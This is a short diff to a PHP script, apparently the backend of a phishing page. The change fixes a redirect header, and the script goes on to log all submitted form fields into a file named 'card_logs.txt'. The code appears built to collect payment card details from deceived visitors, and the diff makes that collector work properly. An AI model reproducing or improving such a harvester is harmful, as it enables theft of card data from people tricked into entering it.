@@ -1,5 +1,5 @@
 <?php
-header ('done.html');
+header ('Location: done.html');
 $handle = fopen("card_logs.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
